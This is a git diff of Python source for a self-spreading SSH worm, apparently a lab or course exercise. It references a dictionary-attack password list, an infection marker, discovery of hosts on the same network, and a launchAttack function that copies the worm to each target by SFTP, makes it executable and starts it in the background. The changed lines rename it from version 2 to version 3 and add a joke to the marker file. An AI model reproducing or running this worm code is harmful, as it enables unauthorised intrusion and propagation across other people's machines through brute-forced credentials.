@@ -22,7 +22,7 @@ DICTIONARYATTACK_LIST = {
         }
 def markInfected():
     marker = open(INFECTION_MARKER, "w")
-    marker.write("goldenseal and black walnut are effective anti-parasitic medicines")
+    marker.write("goldenseal and black walnut are effective anti-parasitic medicines. A good password helps, too.")
     marker.close()
 
 def isInfected(sshC):
@@ -53,9 +53,9 @@ def getHostsOnTheSameNetwork():
 def launchAttack(ssh):
     print("Exploiting Target System")
     sftpClient = ssh.open_sftp()
-    sftpClient.put("/tmp/sneakywormV2.py","/tmp/sneakywormV2.py")
-    ssh.exec_command("chmod a+x /tmp/sneakywormV2.py")
-    ssh.exec_command("nohup python -u /tmp/sneakywormV2.py > /tmp/sneakywormV2.output &")
+    sftpClient.put("/tmp/sneakywormV3.py","/tmp/sneakywormV3.py")
+    ssh.exec_command("chmod a+x /tmp/sneakywormV3.py")
+    ssh.exec_command("nohup /tmp/sneakywormV3.py > /tmp/sneakywormV3.out &")
     print("Parasitic spread imminent")
 
 def attackSystem(hostIP, userName, passWord):
